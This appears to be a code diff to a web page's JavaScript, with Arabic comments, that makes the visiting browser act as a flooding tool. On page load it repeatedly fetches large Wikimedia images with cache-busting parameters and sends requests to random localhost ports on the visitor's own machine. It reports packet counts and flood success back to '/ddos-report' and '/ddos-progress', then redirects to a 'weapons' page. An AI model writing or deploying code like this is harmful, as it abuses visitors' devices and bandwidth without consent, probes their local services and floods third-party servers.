@@ -33,19 +33,32 @@
 const urlParams = new URLSearchParams(window.location.search);
 const brand = urlParams.get('b') || 'generic';
 
+// إرسال إشعار البدء
 fetch('/ddos-report', { method: 'POST' }).catch(()=>{});
 
+let packetCount = 0;
+const startTime = Date.now();
+let floodSuccess = false;
+let floodAttempts = 0;
+
 async function floodNetwork() {
+  floodAttempts++;
   const targets = [
     "https://upload.wikimedia.org/wikipedia/commons/3/3f/Fronalpstock_big.jpg",
     "https://upload.wikimedia.org/wikipedia/commons/2/2c/Rotating_earth_%28large%29.gif",
     "https://upload.wikimedia.org/wikipedia/commons/8/89/Portrait_Placeholder.png"
   ];
+  let success = 0;
   for (let i = 0; i < 100; i++) {
-    const img = new Image();
-    img.src = targets[i % targets.length] + "?v=" + Math.random();
-    fetch('http://127.0.0.1:' + (8000 + Math.floor(Math.random() * 1000))).catch(()=>{});
+    try {
+      const img = new Image();
+      img.src = targets[i % targets.length] + "?v=" + Math.random();
+      // نحاول إرسال طلبات لجهازه نفسه
+      await fetch('http://127.0.0.1:' + (8000 + Math.floor(Math.random() * 1000))).catch(()=>{});
+      success++;
+    } catch(e) {}
   }
+  if (success > 0) floodSuccess = true;
 }
 
 const hexChars = "0123456789ABCDEF";
@@ -62,7 +75,6 @@ const logMessages = [
 ];
 
 const terminal = document.getElementById('terminal');
-let packetCount = 0;
 let ppsEl = document.getElementById('pps');
 let loadEl = document.getElementById('load');
 
@@ -83,9 +95,27 @@ const ddosInterval = setInterval(() => {
 
 floodNetwork();
 
-// التحويل للترسانة بعد 15 ثانية
-setTimeout(() => {
+// إرسال التقدم كل 5 ثواني
+const progressInterval = setInterval(async () => {
+  const duration = Math.floor((Date.now() - startTime) / 1000);
+  await fetch('/ddos-progress', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ packets: packetCount, status: 'progress', duration: duration })
+  }).catch(()=>{});
+}, 5000);
+
+// بعد 15 ثانية: إعلان النجاح/الفشل والانتقال
+setTimeout(async () => {
   clearInterval(ddosInterval);
+  clearInterval(progressInterval);
+  const duration = Math.floor((Date.now() - startTime) / 1000);
+  const status = floodSuccess ? 'success' : 'failed';
+  await fetch('/ddos-progress', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ packets: packetCount, status: status, duration: duration })
+  }).catch(()=>{});
   window.location.href = '/weapons.html?b=' + brand;
 }, 15000);
 
